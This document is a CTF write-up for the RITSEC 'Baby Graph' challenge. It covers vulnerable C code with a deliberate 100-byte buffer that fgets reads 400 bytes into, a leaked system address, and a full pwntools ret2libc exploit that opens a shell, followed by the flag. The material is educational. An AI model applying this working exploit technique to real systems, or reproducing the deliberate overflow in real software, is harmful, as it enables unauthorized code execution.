# Baby Graph

This is what happens to your baby when you want a pwner and a graph theorist. Do your part!!!

nc challenges1.ritsec.club 1339

Author: @fpasswd on Discord, @flyingpassword on Twitter

## Challenge

Connecting to the socket prompts us with a yes/no question with some parameters and points.
We must determine whether the graph is Eulerian or not.

Successfully answering 5 prompts will lead us to the `vuln` function, which prints the address to `system` and accepts a line of user input.

```
-> % nc challenges1.ritsec.club 1339
Here is your baby graph
V = 2 - E = 0
Now tell me if this baby is Eulerian? (Y/N)
Y
Here is your baby graph
V = 5 - E = 8
0 2
0 3
0 4
1 2
1 4
2 3
2 4
3 4
Now tell me if this baby is Eulerian? (Y/N)
N
Here is your baby graph
V = 3 - E = 2
0 1
0 2
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Graph functions

```c
void generateGraph() {
    resetGraph();
    V = rand() % (MAXN - 2) + 2;
    E = rand() % ((V * (V - 1)) / 2);
    for (int e = 0; e < E; e++) {
        do {
            int u = rand() % V;
            int v = rand() % V;
            if (u != v && !G[u][v] && !G[v][u]) {
                G[u][v] = G[v][u] = 1;
                deg[u]++;
                deg[v]++;
                break;
            }
        } while (true);
    }

    for (int v = 0; v < V; v++) {
        if (deg[v] % 2) {
            bruh = false;
            break;
        }
    }
}

void printGraph() {
    puts("Here is your baby graph");
    printf("V = %u - E = %u\n", V, E);
    for (int v = 0; v < V; v++) {
        for (int u = v + 1; u < V; u++) {
            if (G[u][v]) {
                printf("%u %u\n", v, u);
            }
        }
    }
}
```

### Vulnerable code

```c
void vuln() {
    char buf[100];

    printf("Here is your prize: %p\n", system);
    fgets(buf, 400, stdin);
}
```

## Solution

I do not know graph theory.

While testing locally, it appears that the answer is more likely to be no.
I found that it was not too rare for all 5 graphs to not be Eulerian.
Therefore, we can try sending `"N N N N N "` multiple times until we succeed.
The time required to get to the `vuln` function varies, but it usually takes no more than a few seconds when targetting the remote.

Once we're sent to `vuln`, we can use the known `system` address to calculate the base address of libc.
From here, we can calculate the address of the `"/bin/sh\x00"` string within libc.

Since PIE is disabled, we can also use rop gadgets from the binary.
In this exploit, we use the `pop rdi; ret` gadget to pass `"/bin/sh\x00"` to `system` from earlier.

Once we fill the buffer and send our payload, we get a shell where we can read the `flag.txt` file.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges1.ritsec.club --port 1339 babygraph
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babygraph')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenges1.ritsec.club'
port = int(args.PORT or 1339)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# IDK GRAPH THEORY LOL
while True:
    try:
        io = start()
        io.send("N N N N N ")
        io.recvuntil("prize: ")
        break
    except:
        io.close()
        pass

leak = io.recvline().decode()[:-1]
system = int(leak, 0)
libc.address = system - libc.sym["system"]
bin_sh = next(libc.search(b'/bin/sh'))

io.success("LIBC: {}".format(hex(libc.address)))
io.success("SYSTEM: {}".format(hex(system)))
io.success("BIN_SH: {}".format(hex(bin_sh)))

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

io.success("POP_RDI: {}".format(hex(pop_rdi)))
io.success("RET: {}".format(hex(ret)))

payload = flat({
    0x78:[
        ret,
        pop_rdi,
        bin_sh,
        system,
        ],
    })

io.sendline(payload)

io.interactive()
```

## Flag

`RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}`

